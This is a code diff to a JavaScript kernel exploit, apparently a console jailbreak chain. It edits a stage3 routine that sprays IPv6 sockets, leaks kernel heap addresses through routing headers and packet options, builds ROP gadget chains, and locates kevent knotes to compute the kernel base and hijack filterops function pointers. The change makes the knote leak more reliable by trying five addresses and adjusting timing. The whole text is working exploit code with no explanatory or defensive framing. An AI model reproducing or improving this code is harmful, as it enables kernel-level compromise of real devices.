@@ -293,7 +293,7 @@ function stage3() {
 
     const SPRAY_TCLASS = 0x53;
     const TAINT_CLASS = 0x58;
-    const NANOSLEEP_TIME = 150 * 1000; //150µs
+    const NANOSLEEP_TIME = 200 * 1000; //150µs
     const TCLASS_MASTER = 0x2AFE0000;
 
     const PKTOPTS_PKTINFO_OFFSET = 0x10;
@@ -340,11 +340,11 @@ function stage3() {
     const size_of_fake_filterops = 0x28;
     const size_of_loop_counter = 0x8;
     const size_of_kevent = 0x20;
-    const size_of_fix_these_socket = 0x4 * NUM_SPRAY_SOCKS +  0x18;
-
+    const size_of_fix_these_sockets = 0x4 * NUM_SPRAY_SOCKS +  0x18;
+    const size_of_kevent_addrs_ptr = 0x8 * 5;
     const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_nanosleep + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
         size_of_rthdr_buffer + size_of_size_of_rthdr_buffer + size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_kqueues + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_filterops + size_of_loop_counter +
-        size_of_kevent + size_of_fix_these_socket
+        size_of_kevent + size_of_fix_these_sockets + size_of_kevent_addrs_ptr
     );
 
     const triggered = var_memory;
@@ -371,7 +371,8 @@ function stage3() {
     const loop_counter = fake_filterops.add32(size_of_fake_filterops);
     const kevent = loop_counter.add32(size_of_loop_counter);
     const fix_these_sockets_ptr = kevent.add32(size_of_kevent);
-    
+    const kevent_addrs_ptr = fix_these_sockets_ptr.add32(size_of_fix_these_sockets);
+
     var overlapped_socket = -1;
     var overlapped_socket_idx = -1;
 
@@ -381,7 +382,6 @@ function stage3() {
     var slave_socket = -1;
     var slave_socket_idx = -1;
 
-    var leaked_kevent_address = 0;
     var leaked_pktopts_address = 0;
 
     var knote;
@@ -608,19 +608,41 @@ function stage3() {
         const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
         return kaddress;
     }
+    function leak_new_knote() {
+        const ip6r_len = ((0x800 >> 3) -1 & ~1);
+        const ip6r_segleft = (ip6r_len >> 1);
+        const header = (ip6r_len << 8) + (ip6r_segleft << 24);
+        {
+            for(var i = 0; i < 5; i++){
+                chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x800);
+                chain.push_write8(rthdr_buffer, header);
+                chain.push_write8(size_of_rthdr_buffer, 0x800);
+                //create rthdr
+                chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
+                //read rthdr with rthdr
+                chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, size_of_rthdr_buffer);
+
+                //save leaked malloc
+                chain.push(gadgets["pop rdi"]);
+                chain.push(kevent_addrs_ptr.add32(0x8 * i));
+                chain.push(gadgets["pop rax"])
+                chain.push(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
+                chain.push(gadgets["mov rax, [rax]"]);
+                chain.push(gadgets["mov [rdi], rax"]);
+            }
+            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+            for(var i = 0; i < NUM_KQUEUES; i++) {
+                chain.fcall(window.syscalls[363], kqueues[i], kevent, 1, 0, 0, 0);
+            }
+        } chain.run();
+    }
     function leak_addresses() {
         {
             for(var i = 0; i < NUM_SPRAY_SOCKS; i++) {
                 chain.fcall(syscalls[105], spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
             }
         } chain.run();
-        leaked_kevent_address = leak_rthdr_address(0x800);
-        {
-            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-            for(var i = 0; i < NUM_KQUEUES; i++) {
-                chain.fcall(window.syscalls[363], kqueues[i], kevent, 1, 0, 0, 0);
-            }
-        } chain.run();
+        leak_new_knote();
         leaked_pktopts_address = leak_rthdr_address(0x100);
         {
             chain.push_write8(tmp_tclass, 0x10);
@@ -631,15 +653,7 @@ function stage3() {
         } chain.run();
         return;
     }
-    function leak_new_knote() {
-        leaked_kevent_address = leak_rthdr_address(0x800); 
-        {
-            chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-            for(var i = 0; i < NUM_KQUEUES; i++) {
-                chain.fcall(window.syscalls[363], kqueues[i], kevent, 1, 0, 0, 0);
-            }
-        } chain.run();
-    }
+
     function find_slave() {
         {
             chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
@@ -684,14 +698,18 @@ function stage3() {
     }
 
     function find_knote() {
-        knote = kernel_read8(leaked_kevent_address.add32(0x8 * kevent_socket));
-        if(knote.hi == leaked_kevent_address.hi) {
-            knote_filterops = kernel_read8(knote.add32(KNOTE_FOP_OFFSET));
-            if(knote_filterops.hi == 0xFFFFFFFF) {
-                kernel_base = knote_filterops.sub32(KERNEL_SOREAD_FILTEROPS_OFFSET);
-                if(kernel_base.hi == 0xFFFFFFFF && ((kernel_base.low & 0x3FFF) == 0)) {
-                    original_function = kernel_read8(knote_filterops.add32(FILTEROPS_DETACH_OFFSET));
-                    return;
+        for(var i = 0; i < 0x5; i++) {
+            var addr = p.read8(kevent_addrs_ptr.add32(8 * i));
+            knote = kernel_read8(addr.add32(0x8 * kevent_socket));
+            if(knote.hi == addr.hi) {
+                knote_filterops = kernel_read8(knote.add32(KNOTE_FOP_OFFSET));
+                if(knote_filterops.hi == 0xFFFFFFFF) {
+                    kernel_base = knote_filterops.sub32(KERNEL_SOREAD_FILTEROPS_OFFSET);
+                    if(kernel_base.hi == 0xFFFFFFFF && ((kernel_base.low & 0x3FFF) == 0)) {
+                        original_function = kernel_read8(knote_filterops.add32(FILTEROPS_DETACH_OFFSET));
+                        if(i != 0){alert("different knote")}
+                        return;
+                    }
                 }
             }
         }
